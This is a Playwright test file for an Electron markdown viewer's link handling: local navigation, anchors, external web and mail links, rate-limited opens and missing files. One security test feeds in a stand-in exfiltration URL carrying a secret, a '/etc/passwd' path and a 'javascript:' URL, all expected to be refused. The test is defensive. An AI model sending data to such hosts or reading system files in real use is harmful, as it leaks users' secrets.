import path from 'node:path';
import { expect, test, type ElectronApplication, type Page } from '@playwright/test';
import { launchApp } from '../helpers/launch';

const index = path.resolve(import.meta.dirname, '../fixtures/docs/links/index.md');
const env = { GALEO_TEST_EXTERNAL: 'record', GALEO_TEST_BURST_ANSWER: 'block' };

const opened = (app: ElectronApplication) =>
  app.evaluate(() => (globalThis as { __galeoOpenedExternal?: string[] }).__galeoOpenedExternal ?? []);

const heading = (window: Page) => window.getByTestId('document').locator('h1');

test('follows a local link in the same tab, and goes back and forward with Alt+←/→', async () => {
  const { window, close } = await launchApp(['--', index], { env });
  try {
    await expect(heading(window)).toHaveText('Links index');
    await window.getByTestId('document').getByRole('link', { name: 'Other document' }).click();
    await expect(heading(window)).toHaveText('Other document');
    await window.keyboard.press('Alt+ArrowLeft');
    await expect(heading(window)).toHaveText('Links index');
    await window.keyboard.press('Alt+ArrowRight');
    await expect(heading(window)).toHaveText('Other document');
    expect(new URL(window.url()).pathname).toBe('/index.html');
  } finally {
    await close();
  }
});

test('follows reference-style and raw HTML links, landing on the linked section', async () => {
  const { window, close } = await launchApp(['--', index], { env });
  try {
    const document = window.getByTestId('document');
    await document.getByRole('link', { name: 'By reference' }).click();
    await expect(heading(window)).toHaveText('Other document');
    await window.keyboard.press('Alt+ArrowLeft');
    await document.getByRole('link', { name: 'Raw HTML link to a section' }).click();
    await expect(document.locator('h2', { hasText: 'Details' })).toBeInViewport();
  } finally {
    await close();
  }
});

test('an anchor link scrolls within the document, and back returns to the top', async () => {
  const { window, close } = await launchApp(['--', index], { env });
  try {
    const document = window.getByTestId('document');
    const target = document.locator('h2', { hasText: 'Far section' });
    await expect(target).not.toBeInViewport();
    await document.getByRole('link', { name: 'A section further down' }).click();
    await expect(target).toBeInViewport();
    await window.keyboard.press('Alt+ArrowLeft');
    await expect(heading(window)).toBeInViewport();
  } finally {
    await close();
  }
});

test('web and mail links go to the desktop, normalized, and never navigate the page', async () => {
  const { app, window, close } = await launchApp(['--', index], { env });
  try {
    const document = window.getByTestId('document');
    await document.getByRole('link', { name: 'Web' }).click();
    await expect.poll(() => opened(app)).toEqual(['https://example.org/page?x=1']);
    await window.waitForTimeout(1100);
    await document.getByRole('link', { name: 'Mail' }).click();
    await expect.poll(() => opened(app)).toEqual(['https://example.org/page?x=1', 'mailto:someone@example.org']);
    await expect(heading(window)).toHaveText('Links index');
  } finally {
    await close();
  }
});

test('the page cannot open a URL or file the document does not link to (SR-04, SR-12)', async () => {
  const { app, window: page, close } = await launchApp(['--', index], { env });
  try {
    await expect(heading(page)).toBeVisible();
    const results = await page.evaluate(async () => {
      const { tabs: [record] } = await window.galeo.tabs.snapshot();
      const follow = (href: string) => window.galeo.documents.followLink(record!.id, href, 'current');
      return [
        await follow('https://exfil.example/?secret=1'),
        await follow('/etc/passwd'),
        await follow('javascript:alert(1)'),
        await follow('https://example.org/page?x=2'),
      ];
    });
    expect(results).toEqual(Array(4).fill({ kind: 'refused', reason: 'not-in-document' }));
    expect(await opened(app)).toEqual([]);
    await expect(heading(page)).toHaveText('Links index');
  } finally {
    await close();
  }
});

test("the page cannot follow even the document's own links without the reader's input (T6)", async () => {
  const { app, window: page, close } = await launchApp(['--', index], { env });
  try {
    await expect(heading(page)).toBeVisible();
    // Long after any input, so no credit is left from the launch.
    await page.waitForTimeout(1100);
    const results = await page.evaluate(async () => {
      const { tabs: [record] } = await window.galeo.tabs.snapshot();
      const follow = (href: string, where: 'current' | 'background') => window.galeo.documents.followLink(record!.id, href, where);
      return [await follow('https://example.org/page?x=1', 'current'), await follow('mailto:someone@example.org', 'current')];
    });
    expect(results).toEqual(Array(2).fill({ kind: 'refused', reason: 'no-input' }));
    expect(await opened(app)).toEqual([]);
    // The reader's own click still follows it.
    await page.getByTestId('document').getByRole('link', { name: 'Mail' }).click();
    await expect.poll(() => opened(app)).toEqual(['mailto:someone@example.org']);
  } finally {
    await close();
  }
});

test('a burst of external opens is stopped once the user blocks it', async () => {
  const { app, window, close } = await launchApp(['--', index], { env });
  try {
    const document = window.getByTestId('document');
    const names = ['One', 'Two', 'Three'];
    for (const [index, name] of names.entries()) {
      await document.getByRole('link', { name }).click();
      // Space the opens more than the one-per-second limit apart, from when each happened.
      await expect.poll(async () => (await opened(app)).length).toBe(index + 1);
      await window.waitForTimeout(1050);
    }
    await document.getByRole('link', { name: 'Four' }).click();
    await expect(window.getByTestId('status-message')).toHaveText('Links from this document are blocked');
    expect(await opened(app)).toEqual(['https://one.example/', 'https://two.example/', 'https://three.example/']);
  } finally {
    await close();
  }
});

test('a link to a missing file opens it in the missing state', async () => {
  const { window, close } = await launchApp(['--', index], { env });
  try {
    await window.getByTestId('document').getByRole('link', { name: 'Missing file' }).click();
    await expect(window.getByTestId('document-state')).toHaveAttribute('data-state', 'missing');
  } finally {
    await close();
  }
});
